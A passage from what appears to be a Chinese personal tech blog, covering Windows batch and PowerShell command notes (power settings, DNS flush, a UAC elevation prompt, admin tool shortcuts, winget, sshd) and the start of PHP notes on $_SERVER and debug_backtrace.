class="title">S3</span>)不可用。</span></span><br><span class="line"><span class="function">        休眠不可用。</span></span><br><span class="line"><span class="function">        虚拟机监控程序不支持此待机状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    快速启动</span></span><br><span class="line"><span class="function">        休眠不可用。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:: 开启/禁止系统休眠，只是配置开启，不是立马进入</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">powercfg</span> -<span class="title">h</span> <span class="title">on</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">powercfg</span> -<span class="title">h</span> <span class="title">off</span></span></span><br></pre></td></tr></table></figure>

<h2 id="25-ipconfig-网络配置"><a href="#25-ipconfig-网络配置" class="headerlink" title="25. ipconfig 网络配置"></a>25. ipconfig 网络配置</h2><h3 id="25-1-刷新本地dns缓存"><a href="#25-1-刷新本地dns缓存" class="headerlink" title="25.1. 刷新本地dns缓存"></a>25.1. 刷新本地dns缓存</h3><ul>
<li>所有dns请求重新解析</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">ipconfig</span> /<span class="title">flushdns</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Windows</span> <span class="title">IP</span> 配置</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">已成功刷新 <span class="title">DNS</span> 解析缓存。</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h2 id="26-弹框获取管理员权限"><a href="#26-弹框获取管理员权限" class="headerlink" title="26. 弹框获取管理员权限"></a>26. 弹框获取管理员权限</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> current_dir=%~dp0</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%current_dir%</span></span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off&amp;<span class="built_in">color</span> <span class="number">17</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> &quot;<span class="variable">%SystemRoot%</span>\SysWOW64&quot; <span class="built_in">path</span> <span class="variable">%path%</span>;<span class="variable">%windir%</span>\SysNative;<span class="variable">%SystemRoot%</span>\SysWOW64;%~dp0</span><br><span class="line">bcdedit &gt;<span class="built_in">nul</span></span><br><span class="line"><span class="keyword">if</span> &#x27;<span class="variable">%errorlevel%</span>&#x27; <span class="keyword">NEQ</span> &#x27;<span class="number">0</span>&#x27; (<span class="keyword">goto</span> UACPrompt) <span class="keyword">else</span> (<span class="keyword">goto</span> UACAdmin)</span><br><span class="line">:UACPrompt</span><br><span class="line">%<span class="number">1</span> <span class="built_in">start</span> &quot;&quot; mshta vbscript:createobject(&quot;shell.application&quot;).shellexecute(&quot;&quot;&quot;%~<span class="number">0</span>&quot;&quot;&quot;,&quot;::&quot;,,&quot;runas&quot;,<span class="number">1</span>)(window.close)&amp;<span class="keyword">exit</span></span><br><span class="line"><span class="keyword">exit</span> /B</span><br><span class="line">:UACAdmin</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="variable">%current_dir%</span></span><br></pre></td></tr></table></figure>

<h2 id="27-windows特殊目录"><a href="#27-windows特殊目录" class="headerlink" title="27. windows特殊目录"></a>27. windows特殊目录</h2><ul>
<li><code>％AllUsersProfile％</code>: 打开所有用户的配置文件 <code>C:\ProgramData</code></li>
<li><code>％AppData％</code>: 打开AppData文件夹 <code>C:\Users\&#123;username&#125;\AppData\Roaming</code></li>
<li><code>％CommonProgramFiles％</code>: <code>C:\Program Files\Common Files</code></li>
<li><code>％CommonProgramFiles（x86）％</code>: <code>C:\Program Files (x86)\Common Files</code></li>
<li><code>％HomeDrive％</code>: 打开您的主驱动器 <code>C:\</code></li>
<li><code>％LocalAppData％</code>: 打开本地AppData文件夹 <code>C:\Users\&#123;username&#125;\AppData\Local</code></li>
<li><code>％ProgramData％</code>: <code>C:\ProgramData</code></li>
<li><code>％ProgramFiles％</code>: <code>C:\Program Files</code>或<code>C:\Program Files (x86)</code></li>
<li><code>％ProgramFiles（x86）％</code>: <code>C:\Program Files (x86)</code></li>
<li><code>％Public％</code>: <code>C:\Users\Public</code></li>
<li><code>％SystemDrive％</code>: <code>C:</code></li>
<li><code>％SystemRoot％</code>: 打开Windows文件夹 <code>C:\Windows</code></li>
<li><code>％Temp％</code>: 打开临时文件文件夹 <code>C:\Users\&#123;Username&#125;\AppData\Local\Temp</code></li>
<li><code>％UserProfile％</code>: 打开用户的配置文件 <code>C:\Users\&#123;username&#125;</code></li>
<li><code>％AppData％\ Microsoft \ Windows \ Start菜单\程序\启动</code>: 打开Windows 10启动位置以获取程序快捷方式</li>
</ul>
<h2 id="28-windows常用工具命令"><a href="#28-windows常用工具命令" class="headerlink" title="28. windows常用工具命令"></a>28. windows常用工具命令</h2><h3 id="打开管理软件"><a href="#打开管理软件" class="headerlink" title="打开管理软件"></a>打开管理软件</h3><ul>
<li><code>taskmgr</code>: 任务管理器</li>
<li><code>appwiz.cpl</code>: 卸载或更改程序</li>
<li><code>sysdm.cpl</code>: 系统属性（环境变量、远程等）</li>
<li><code>ncpa.cpl</code>: 网络连接属性（适配器属性）</li>
<li><code>devmgmt.msc</code>: 设备管理器</li>
<li><code>diskmgmt.msc</code>: 磁盘管理</li>
<li><code>services.msc</code>: 服务管理</li>
<li><code>desk.cpl</code>: 显示相关设置</li>
<li><code>CHARMAP</code>: 字符映射表</li>
<li><code>cleanmgr</code>: 磁盘清理器</li>
<li><code>comexp.msc</code>: 组件服务，包含事件查看器和服务管理</li>
<li><code>eventvwr.msc</code>: 事件查看器</li>
<li><code>lusrmgr.msc</code>: 本地用户和组</li>
<li><code>secpol.msc</code>: 本地安全策略</li>
<li><code>Dxdiag</code>: DirectX诊断工具</li>
<li><code>Explorer</code>: 文件资源管理器</li>
<li><code>wf.msc</code>: 防火墙管理器</li>
<li><code>msconfig</code>: 启动相关配置，开机启动服务、启动项、引导等</li>
<li><code>msinfo32</code>: 系统详细信息</li>
<li><code>regedit</code>: 注册表编辑器</li>
<li><code>gpedit</code>: 本地组策略编辑器</li>
<li><code>certmgr.msc</code>: 证书管理器</li>
<li><code>fsmgmt.msc</code>: 文件夹共享管理</li>
<li><code>compmgmt.msc</code>: 计算机管理</li>
<li><code>wmimgmt.msc</code>: wmi管理控件</li>
<li><code>perfmon.msc</code>: 性能监视器</li>
<li><code>powercfg.cpl</code>: 电源选项</li>
<li><code>inetcpl.cpl</code>: internel选项</li>
<li><code>main.cpl</code>: 鼠标属性</li>
<li><code>joy.cpl</code>: 游戏手柄属性</li>
<li><code>timedate.cpl</code>: 日期和时间</li>
<li><code>intl.cpl</code>: 区域设置</li>
<li><code>sndvol</code>: 音量控制</li>
<li><code>mmsys.cpl</code>: 声音和音频设备属性</li>
<li><code>telephon.cpl</code>: 电话和调制解调器选项</li>
<li><code>wscui.cpl</code>: 控制面板的安全和维护</li>
<li><code>firewall.cpl</code>: 控制面板的防火墙设置</li>
<li><code>Odbcad32</code>: ODBC数据源管理</li>
</ul>
<h3 id="好用的命令"><a href="#好用的命令" class="headerlink" title="好用的命令"></a>好用的命令</h3><ul>
<li><code>systeminfo</code>: 列举出系统所有信息</li>
<li><code>Defrag</code>: 磁盘碎片整理工具</li>
<li><code>Ftp</code>: ftp.exe程序</li>
<li><code>netstat</code>: 网络连接状态</li>
<li><code>nslookup</code>: 域名解析</li>
<li><code>telnet</code>: 连接测试</li>
<li><code>taskkill</code>: 杀进程</li>
<li><code>regsvr32</code>: 注册一个dll</li>
<li><code>tracert</code>: 路由追踪</li>
<li><code>sfc</code>: 文件扫描并修复</li>
</ul>
<h3 id="Microsoft-Office套件"><a href="#Microsoft-Office套件" class="headerlink" title="Microsoft Office套件"></a>Microsoft Office套件</h3><p>winword -Microsoft Word<br>excel -Microsoft Excel<br>powerpnt -Microsoft PowerPoint<br>msaccess -Microsoft Access<br>Outlook -Microsoft Outlook<br>ois -Microsoft Picture Manager</p>
<h2 id="29-timeout-等待"><a href="#29-timeout-等待" class="headerlink" title="29. timeout 等待"></a>29. timeout 等待</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 等待<span class="number">5</span>秒后继续操作</span><br><span class="line">timeout /t <span class="number">5</span></span><br></pre></td></tr></table></figure>

<h2 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h2><h3 id="1-逻辑判断中多行设置变量不符合预期"><a href="#1-逻辑判断中多行设置变量不符合预期" class="headerlink" title="1. 逻辑判断中多行设置变量不符合预期"></a>1. 逻辑判断中多行设置变量不符合预期</h3><p><strong>示例</strong></p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> a=<span class="number">123</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%a%</span> == <span class="number">123</span> (</span><br><span class="line">    <span class="built_in">set</span> a=<span class="variable">%a%</span><span class="number">4</span></span><br><span class="line">    <span class="built_in">set</span> a=<span class="variable">%a%</span><span class="number">5</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> a=<span class="variable">%a%</span></span><br></pre></td></tr></table></figure>

<ul>
<li>认为输出的是<code>a=12345</code></li>
<li>实际输出的是<code>a=1235</code></li>
</ul>
<p><strong>原因</strong></p>
<ul>
<li>虽然括号内写成了多行，实际认为是一行</li>
<li>batch解析时，**<font color="red">每一行命令会先将变量替换成值，再进行处理</font>**</li>
<li>所以上述翻译过来就是</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> a=<span class="number">123</span></span><br><span class="line">:: 下面将 <span class="variable">%a%</span> 替换成<span class="number">123</span>得到</span><br><span class="line"><span class="keyword">if</span> <span class="number">123</span> == <span class="number">123</span> (</span><br><span class="line">    <span class="built_in">set</span> a=<span class="number">1234</span></span><br><span class="line">    <span class="built_in">set</span> a=<span class="number">1235</span></span><br><span class="line">)</span><br><span class="line">:: 上面一行 a=<span class="number">1235</span>，所以这里将<span class="variable">%a%</span>替换成<span class="number">1235</span></span><br><span class="line"><span class="built_in">echo</span> a=<span class="number">1235</span></span><br></pre></td></tr></table></figure>

<p><strong>解决</strong></p>
<ul>
<li>使用<code>setlocal enabledelayedexpansion</code>，启用延迟解析</li>
<li>即不提前将值替换进去</li>
<li>然后变量两边的<code>%</code>换成<code>!</code>即可</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> a=<span class="number">123</span></span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%a%</span> == <span class="number">123</span> (</span><br><span class="line">    <span class="built_in">set</span> a=<span class="variable">!a!</span><span class="number">4</span></span><br><span class="line">    <span class="built_in">set</span> a=<span class="variable">!a!</span><span class="number">5</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> a=<span class="variable">%a%</span></span><br></pre></td></tr></table></figure>

<ul>
<li>输出<code>a=12345</code></li>
</ul>
<h1 id="二、powershell"><a href="#二、powershell" class="headerlink" title="二、powershell"></a>二、powershell</h1><h2 id="1-一些基本用法"><a href="#1-一些基本用法" class="headerlink" title="1. 一些基本用法"></a>1. 一些基本用法</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 打印环境变量</span><br><span class="line">PS&gt; $env:xxx</span><br><span class="line">:: 设置环境变量</span><br><span class="line">PS&gt; $env:TestVar1=&quot;This is my environment variable&quot;</span><br><span class="line">:: 枚举环境变量，注意后面有个冒号</span><br><span class="line">PS&gt; ls env:</span><br><span class="line">:: 删除环境变量</span><br><span class="line">PS&gt; <span class="built_in">del</span> env:windir</span><br><span class="line"></span><br><span class="line">:::::::::: 文件操作 ::::::::::</span><br><span class="line">:: 新建文件</span><br><span class="line">PS&gt; New-item xxx.txt -<span class="built_in">type</span> file</span><br></pre></td></tr></table></figure>

<h2 id="2-网络相关"><a href="#2-网络相关" class="headerlink" title="2. 网络相关"></a>2. 网络相关</h2><h3 id="2-1-网卡信息"><a href="#2-1-网卡信息" class="headerlink" title="2.1. 网卡信息"></a>2.1. 网卡信息</h3><h4 id="1-获取网卡信息"><a href="#1-获取网卡信息" class="headerlink" title="1) 获取网卡信息"></a>1) 获取网卡信息</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">PS&gt; Get-NetIPInterface</span><br><span class="line"></span><br><span class="line">ifIndex InterfaceAlias                  AddressFamily NlMtu(Bytes) InterfaceMetric Dhcp     ConnectionState PolicyStore</span><br><span class="line">------- --------------                  ------------- ------------ --------------- ----     --------------- -----------</span><br><span class="line"><span class="number">27</span>      vEthernet (Default Switch)      IPv6                  <span class="number">1500</span>            <span class="number">5000</span> Enabled  Connected       ActiveStore</span><br><span class="line"><span class="number">21</span>      以太网 <span class="number">2</span>                        IPv6                  <span class="number">1500</span>              <span class="number">15</span> Enabled  Connected       ActiveStore</span><br><span class="line"><span class="number">1</span>       Loopback Pseudo-Interface <span class="number">1</span>     IPv6            <span class="number">4294967295</span>              <span class="number">75</span> Disabled Connected       ActiveStore</span><br><span class="line"><span class="number">27</span>      vEthernet (Default Switch)      IPv4                  <span class="number">1500</span>            <span class="number">5000</span> Disabled Connected       ActiveStore</span><br><span class="line"><span class="number">21</span>      以太网 <span class="number">2</span>                        IPv4                  <span class="number">1500</span>              <span class="number">15</span> Disabled Connected       ActiveStore</span><br><span class="line"><span class="number">1</span>       Loopback Pseudo-Interface <span class="number">1</span>     IPv4            <span class="number">4294967295</span>              <span class="number">75</span> Disabled Connected       ActiveStore</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-设置网卡优先级"><a href="#2-设置网卡优先级" class="headerlink" title="2) 设置网卡优先级"></a>2) 设置网卡优先级</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: InterfaceIndex是Get-NetIPInterface获取到的ifIndex</span><br><span class="line">:: InterfaceMetric越大优先级越低</span><br><span class="line">PS&gt; <span class="built_in">Set</span>-NetIPInterface -InterfaceIndex <span class="number">59</span> -InterfaceMetric <span class="number">50</span></span><br></pre></td></tr></table></figure>

<h2 id="3-软件安装"><a href="#3-软件安装" class="headerlink" title="3. 软件安装"></a>3. 软件安装</h2><h3 id="3-1-内置安装器"><a href="#3-1-内置安装器" class="headerlink" title="3.1. 内置安装器"></a>3.1. 内置安装器</h3><h4 id="1-安装msixbundle"><a href="#1-安装msixbundle" class="headerlink" title="1) 安装msixbundle"></a>1) 安装msixbundle</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">PS&gt; Add-AppxPackage xxx.msixbundle</span><br></pre></td></tr></table></figure>

<h3 id="3-2-winget"><a href="#3-2-winget" class="headerlink" title="3.2. winget"></a>3.2. winget</h3><h4 id="1-安装winget"><a href="#1-安装winget" class="headerlink" title="1) 安装winget"></a>1) 安装winget</h4><ul>
<li>github仓库: <a href="https://github.com/microsoft/winget-cli">https://github.com/microsoft/winget-cli</a></li>
<li>到上面的release下载一个msixbundle安装包</li>
<li>使用powershell执行<code>Add-AppxPackage xxx.msixbundle</code>就可用了</li>
</ul>
<h4 id="2-install-安装软件"><a href="#2-install-安装软件" class="headerlink" title="2) install 安装软件"></a>2) install 安装软件</h4><h5 id="选项-1"><a href="#选项-1" class="headerlink" title="选项"></a>选项</h5><ul>
<li><code>--location [dir]</code>: 指定路径，部分软件不支持</li>
<li><code>--scope &lt;user/machine&gt;</code>: 指定安装范围，部分软件不支持，用户安装到用户的AppData下，电脑则安装到<code>C:\Program Files</code>下</li>
</ul>
<h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="1-powershell-使用-utf-8-编码"><a href="#1-powershell-使用-utf-8-编码" class="headerlink" title="1. powershell 使用 utf-8 编码"></a>1. powershell 使用 utf-8 编码</h2><ul>
<li>启动 powershell 时输入</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chcp</span> <span class="number">65001</span></span><br></pre></td></tr></table></figure>

<h2 id="2-windows-10-启用-sshd-服务"><a href="#2-windows-10-启用-sshd-服务" class="headerlink" title="2. windows 10 启用 sshd 服务"></a>2. windows 10 启用 sshd 服务</h2><ul>
<li>需要在功能中安装<code>OpenSSH Server</code></li>
<li>在命令行中执行，登陆帐号密码和微软一致</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 开启</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> sshd</span><br><span class="line">:: 关闭</span><br><span class="line"><span class="built_in">net</span> stop sshd</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>php学习笔记</title>
    <url>/blogs/2019-12-11-php/</url>
    <content><![CDATA[<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p><a href="https://www.php.net/docs.php">官方文档</a></p>
<h2 id="内置定义"><a href="#内置定义" class="headerlink" title="内置定义"></a>内置定义</h2><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;xxx&quot;</span> . PHP_EOL);      <span class="comment">// PHP_EOL根据系统决定的/r/n还是/n换行符</span></span><br><span class="line"><span class="comment">// 同C一样有行数函数和文件的定义</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;xxx&quot;</span> . <span class="keyword">__LINE__</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;xxx&quot;</span> . <span class="keyword">__FUNCTION__</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;xxx&quot;</span> . <span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<h4 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;php://stdout&quot;</span>, <span class="string">&quot;xxx&quot;</span>);   <span class="comment">// 输出到标准输出</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;php://output&quot;</span>, <span class="string">&quot;xxx&quot;</span>);   <span class="comment">// 输出到结果输出（浏览器返回）</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://stdin&quot;</span>);           <span class="comment">// 获取标准输入</span></span><br></pre></td></tr></table></figure>

<h4 id="服务器相关"><a href="#服务器相关" class="headerlink" title="服务器相关"></a>服务器相关</h4><h5 id="SERVER-服务器相关信息"><a href="#SERVER-服务器相关信息" class="headerlink" title="$_SERVER 服务器相关信息"></a>$_SERVER 服务器相关信息</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$_SERVER</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;USER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wangyubo&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HOME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/wangyubo&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gzip, deflate&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_ACCEPT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_USER_AGENT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_UPGRADE_INSECURE_REQUESTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_CACHE_CONTROL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;max-age=0&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_CONNECTION&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keep-alive&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;HTTP_HOST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.240.17.107:8082&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REDIRECT_STATUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;200&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;SERVER_NAME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;SERVER_PORT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8082&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;SERVER_ADDR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.240.17.107&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REMOTE_PORT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;50539&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REMOTE_ADDR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.22.72.133&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;SERVER_SOFTWARE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nginx/1.10.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;GATEWAY_INTERFACE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CGI/1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REQUEST_SCHEME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;SERVER_PROTOCOL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HTTP/1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;DOCUMENT_ROOT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/wangyubo/work/codeFiles/php/www&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;DOCUMENT_URI&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REQUEST_URI&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;SCRIPT_NAME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;CONTENT_LENGTH&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;CONTENT_TYPE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REQUEST_METHOD&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;QUERY_STRING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;SCRIPT_FILENAME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/wangyubo/work/codeFiles/php/www/index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;PATH_INFO&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;FCGI_ROLE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RESPONDER&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;PHP_SELF&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REQUEST_TIME_FLOAT&quot;</span><span class="punctuation">:</span> <span class="number">1576150192.5111</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;REQUEST_TIME&quot;</span><span class="punctuation">:</span> <span class="number">1576150192</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="POST-请求参数"><a href="#POST-请求参数" class="headerlink" title="$_POST 请求参数"></a>$_POST 请求参数</h5><p>请求参数都会存放在$_POST中</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="堆栈信息-debug-backtrace"><a href="#堆栈信息-debug-backtrace" class="headerlink" title="堆栈信息 debug_backtrace()"></a>堆栈信息 debug_backtrace()</h4><ul>
<li>参数只有一个，堆栈深度</li>
<li>返回数组类型的结果，var_dump如下</li>
</ul>
<p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">debug_backtrace</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">myFunc1</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">myFunc2</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc4</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">myFunc3</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myFunc4</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]=&gt;</span><br><span class="line">    string(21) &quot;/home/ubuntu/test.php&quot;</span><br><span class="line">    [&quot;line&quot;]=&gt;</span><br><span class="line">    int(9)</span><br><span class="line">    [&quot;function&quot;]=&gt;</span><br><span class="line">    string(7) &quot;myFunc1&quot;</span><br><span class="line">    [&quot;args&quot;]=&gt;</span><br><span class="line">    array(0) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]=&gt;</span><br><span class="line">    string(21) &quot;/home/ubuntu/test.php&quot;</span><br><span class="line">    [&quot;line&quot;]=&gt;</span><br><span class="line">    int(14)</span><br><span class="line">    [&quot;function&quot;]=&gt;</span><br><span class="line">    string(7) &quot;myFunc2&quot;</span><br><span class="line">    [&quot;args&quot;]=&gt;</span><br><span class="line">    array(0) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]=&gt;</span><br><span class="line">    string(21) &quot;/home/ubuntu/test.php&quot;</span><br><span class="line">    [&quot;line&quot;]=&gt;</span><br><span class="line">    int(18)</span><br><span class="line">    [&quot;function&quot;]=&gt;</span><br><span class="line">    string(7) &quot;myFunc3&quot;</span><br><span class="line">    [&quot;args&quot;]=&gt;</span><br><span class="line">    array(0) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="捕获标准输出函数"><a href="#捕获标准输出函数" class="headerlink" title="捕获标准输出函数"></a>捕获标准输出函数</h2><p>许多函数的输出直接到标准输出，无法存入变量处理，可以使用ob_start()函数进行捕获</p>
